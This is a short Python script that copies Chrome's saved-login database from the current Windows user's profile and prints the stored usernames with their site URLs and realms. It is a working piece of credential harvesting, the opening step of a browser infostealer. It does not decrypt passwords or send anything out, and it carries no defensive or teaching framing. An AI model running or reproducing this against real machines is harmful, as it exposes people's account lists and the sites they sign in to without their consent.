import sqlite3 
import shutil
import psutil

username = psutil.users()[0].name

shutil.copyfile('C:/Users/' + username + '/AppData/Local/Google/Chrome/User Data/Default/Login Data', 'C:/Users/' + username + '/AppData/Local/Google/Chrome/User Data/Default/Login_Data_Copy')

conn = sqlite3.connect("C:/Users/" + username + "/AppData/Local/Google/Chrome/User Data/Default/Login_Data_Copy")
c = conn.cursor()

for row in c.execute('SELECT username_value, origin_url, signon_realm FROM logins WHERE username_value != ""'):
    print(row)

conn.close()
